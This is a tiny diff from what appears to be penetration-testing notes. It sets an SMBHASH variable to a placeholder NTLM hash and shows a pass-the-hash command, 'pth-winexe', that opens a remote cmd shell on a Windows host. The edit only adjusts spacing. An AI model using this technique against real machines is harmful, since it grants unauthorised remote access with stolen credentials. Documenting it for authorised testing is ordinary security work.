@@ -65,7 +65,7 @@ export SMBHASH=<<<<<<<<<<<<<<NTLM_HASH_HERE>>>>>>>>>>>>>>>>>>
 
 2 .run the command:
 
-pth-winexe -U <USER>% //x.x.x.x cmd
+pth-winexe -U <USER> % //x.x.x.x cmd
     
     
 
